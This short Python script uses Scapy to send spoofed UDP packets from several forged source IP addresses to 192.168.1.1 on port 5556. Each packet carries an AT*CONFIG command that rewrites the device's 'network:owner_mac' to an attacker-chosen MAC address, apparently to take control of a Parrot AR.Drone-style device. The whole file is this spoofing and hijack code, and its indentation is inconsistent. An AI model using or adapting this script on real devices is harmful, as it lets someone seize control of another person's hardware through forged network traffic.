from scapy.all import *

newMac = "00:04:ff:ff:ff:a6"
seqno = 9223372036854775807
offsets = ( 8, 20 )

IPs = [ "192.168.1.2", "192.168.1.3", "192.168.1.4", "192.168.1.5" ]

def _spoof_command( f_command ):
	global offsets
	global IPs
	for ip in IPs:
		datalength = len( f_command ) + offsets[ 0 ]
        s_packet = Ether( ) / IP( dst = "192.168.1.1", src = ip, len = datalength + offsets[1] )/ UDP( sport = 5554, dport = 5556, len = datalength ) / f_command
        s_packet.show()
        sendp( s_packet )


command = """AT*CONFIG=%d,"network:owner_mac","%s"\r""" % ( seqno, newMac )
_spoof_command( command )